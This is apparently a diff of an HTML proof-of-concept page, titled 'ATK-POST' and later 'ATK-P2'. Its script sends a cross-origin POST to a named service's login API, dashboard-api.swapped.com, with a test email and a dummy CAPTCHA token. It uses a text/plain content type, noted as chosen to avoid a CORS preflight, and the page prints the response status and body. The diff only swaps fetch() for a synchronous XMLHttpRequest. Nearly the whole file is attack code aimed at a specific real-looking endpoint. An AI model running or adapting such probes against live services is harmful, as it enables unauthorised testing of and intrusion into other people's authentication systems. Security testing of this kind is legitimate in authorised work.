@@ -1,20 +1,16 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-POST</title></head>
-<body><pre id="out">P-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-P2</title></head>
+<body><pre id="out">P2-START</pre>
 <script>
-(async () => {
-  try {
-    // simple POST (JSON, no custom headers → no preflight)
-    const r = await fetch("https://dashboard-api.swapped.com/api/v1/auth/login", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ email: "poc-test@swapped.com", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" })
-    });
-    document.title = "ATK-P-" + r.status;
-    document.getElementById("out").textContent = "P-RESULT " + r.status + " :: " + (await r.text()).slice(0, 300);
-  } catch (e) {
-    document.title = "ATK-P-ERR";
-    document.getElementById("out").textContent = "P-ERR " + e.message;
-  }
-})();
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://dashboard-api.swapped.com/api/v1/auth/login", false);
+  xhr.setRequestHeader("Content-Type", "text/plain");
+  xhr.send(JSON.stringify({ email: "poc-test@swapped.com", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" }));
+  document.title = "ATK-P2-" + xhr.status;
+  document.getElementById("out").textContent = "P2-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 300);
+} catch (e) {
+  document.title = "ATK-P2-ERR";
+  document.getElementById("out").textContent = "P2-ERR " + e.message;
+}
 </script></body></html>
